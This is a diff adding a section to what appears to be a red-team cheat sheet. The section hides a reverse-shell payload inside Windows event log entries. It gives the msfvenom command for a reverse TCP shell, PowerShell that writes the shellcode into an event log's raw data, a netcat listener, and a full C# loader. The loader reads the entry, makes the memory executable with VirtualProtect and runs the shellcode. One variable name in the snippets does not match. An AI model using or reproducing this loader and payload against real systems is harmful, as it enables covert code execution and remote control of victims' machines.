@@ -122,3 +122,85 @@ from a saved evtx file:
 ```
 PS C:\> Get-WinEvent -FilterHashtable @{path="WindowsDefender.evtx";id=1116,1117}
 ```
+
+## Execute Payloads Utilizing Windows Event Logs:
+
+Create variable to contain payload:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<> LPORT=<> -f hex
+```
+
+```
+$msf = '<Insert Shellcode as Hex Literal String'
+```
+
+Convert Payload variable to hex byte array:
+
+```
+$hashByteArray = [byte[]] ($payload -replace '..', '0x$&,' -split ',' -ne '')
+```
+
+Create new event log entry:
+
+```
+Write-Event -LogName 'Key Management Service' -Source KmsRequests -EventID 31337 -EventType Information -Category 0 -Message 'Here be Dragons' -RawData $HashByteArray
+```
+
+Start your listener:
+
+```
+nc -nvlp 1337
+```
+
+Execute code injector utilizing this code:
+
+```
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace EventLogsForRedTeams
+{
+    class Program
+    { 
+
+    [DllImport("kernel32.dll")]
+    public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect,
+            out UInt32 lpflOldProtect);
+
+    private delegate IntPtr ptrShellCode();
+    static void Main(string[] args)
+    {
+        // Create a new EventLog object.
+        EventLog theEventLog1 = new EventLog();
+
+        theEventLog1.Log = "Key Management Service";
+
+        // Obtain the Log Entries of the Event Log
+        EventLogEntryCollection myEventLogEntryCollection = theEventLog1.Entries;
+
+        byte[] data_array = myEventLogEntryCollection[0].Data;
+
+        Console.WriteLine("*** Found Payload in " + theEventLog1.Log + " ***");
+        Console.WriteLine("");
+        Console.WriteLine("*** Injecting Payload ***");
+
+        // inject the payload
+        GCHandle SCHandle = GCHandle.Alloc(data_array, GCHandleType.Pinned);
+        IntPtr SCPointer = SCHandle.AddrOfPinnedObject();
+        uint flOldProtect;
+
+        if (VirtualProtect(SCPointer, (UIntPtr)data_array.Length, 0x40, out flOldProtect))
+        {
+            ptrShellCode sc = (ptrShellCode)Marshal.GetDelegateForFunctionPointer(SCPointer, typeof(ptrShellCode));
+            sc();
+        }
+    }
+}
+}
+```
+
+@BHIS 
+Source: https://github.com/roobixx/EventLogForRedTeams
+
